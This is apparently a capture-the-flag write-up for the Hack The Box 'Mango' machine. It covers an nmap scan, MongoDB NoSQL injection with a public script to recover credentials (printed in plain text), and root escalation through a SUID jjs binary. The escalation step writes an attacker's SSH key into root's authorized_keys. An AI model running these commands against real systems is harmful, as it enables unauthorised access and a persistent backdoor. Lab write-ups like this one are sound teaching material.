# Mango
Box IP **10.10.10.162**


### Nmap scan

```bash
$ nmap -sC -sV -T5 -v mango.htb
```

### Services
```
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
```

Access to webserver on port 80 is forbidden, and connection of port 443 reveals an invalid certificate

By investigating the certificate we find some interesting info

<p align="center">
  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/master/HackTheBox/b2r/Mango/src/1.png" alt="1" />
</p>

We add this domain to our hosts file and by surfing to it we get a login page


### MongoDB

We exploit a [NonSQLi](https://github.com/lorenzoinvidia/HackTheBox-CheatSheets/wiki/Web#NonSQLi) in [MongoDB](https://docs.mongodb.com/manual/reference/operator/query/regex/) to enumerate **users** and **password**.

If the regex matches, the server replies with status **302**, otherwise with **200**

We [speedup](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration/blob/master/nosqli-user-pass-enum.py) the credential grabbing by

```bash
$ python3 nosqli-user-pass-enum.py -u https://staging-order.mango.htb -m POST -up username -pp password -op login:login -ep username
$ python3 nosqli-user-pass-enum.py -u http://staging-order.mango.htb -m POST -up username -pp password -op login:login -ep password
```

And we get **mango:h3mXK8RhU~f{]f5H** and **admin:t9KcS3>!0B#2**

We authenticate as **mango** in SSH and by switching user to **admin** we get the user flag


### Privilege Escalation

By searching for suid binaries
```
$ find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
```

we find a jss binary /usr/lib/jvm/java-11-openjdk-amd64/bin/**jjs**

As [gtfobins](https://gtfobins.github.io/gtfobins/jjs/) suggests we basically can

- write our ssh PK in the root directory
```
$ echo 'var FileWriter = Java.type("java.io.FileWriter");
var fw=new FileWriter("/root/.ssh/authorized_keys");
fw.write("PUBLIC KEY");
fw.close();' | jjs
```

- open a [reverse shell](https://github.com/lorenzoinvidia/HackTheBox-CheatSheets/wiki/Shells#spawn-reverse-shell)

- directly print the root flag

<p align="center">
  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/master/HackTheBox/b2r/Mango/src/2.png" alt="1" />
</p>


If you liked this writeup, please leave a respect on my hackthebox

![htbbadge](https://www.hackthebox.eu/badge/image/77747)
